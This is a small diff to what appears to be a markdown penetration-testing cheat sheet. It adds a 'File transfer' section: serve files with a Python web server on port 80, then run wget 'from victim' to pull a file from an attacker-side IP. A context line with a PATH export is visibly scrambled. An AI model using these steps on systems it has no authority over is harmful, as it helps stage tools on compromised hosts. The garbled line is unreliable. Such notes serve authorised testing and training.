@@ -139,7 +139,10 @@ Fix shell:<br/>
 export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
 /games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>
 
-
-
+## File transfer:
+Start web server in the current directory on port 80:<br/>
+`python3 -m http.server 80'<br/>
+Upload from victim:<br/>
+`wget 192.168.119.xxx:80/some_file'<br/>
 
 
